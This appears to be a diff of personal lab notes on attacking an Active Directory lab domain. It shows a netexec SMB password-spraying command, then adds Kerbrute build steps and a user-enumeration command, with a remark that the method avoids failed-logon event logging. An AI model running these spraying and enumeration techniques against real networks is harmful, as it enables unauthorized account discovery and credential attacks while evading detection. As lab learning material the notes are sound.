@@ -26,4 +26,12 @@ Now i can test password spraying or bruteforce
 - nxc smb 192.168.56.102 -u account.txt -p password.txt --no-bruteforce --continue-on-success
 for the passwords list i copy first lines of /usr/share/worlists/rockyou.txt and then add the password i already have to it
 
+I used the kerbrute tool to made enumeration targetting kerberos as it doesn't triggered 4625 failed authentication 
 
+Kerbrute exploits the fact that Kerberos returns different error codes for valid vs. invalid usernames before authentication occurs. When a valid username is submitted, the KDC responds with "KDC_ERR_PREAUTH_REQUIRED" (pre-authentication needed), while invalid usernames return "KDC_ERR_C_PRINCIPAL_UNKNOWN" (principal unknown). This distinction enables rapid user enumeration. 
+
+- git clone https://github.com/ropnop/kerbrute.git 
+- cd kerbrute
+- go build
+- ./kerbrute -h
+- ./kerbrute userenum --dc 192.168.56.102 -d blueteamlab.local /usr/share/seclists/Usernames/top-usernames-shortlist.txt 
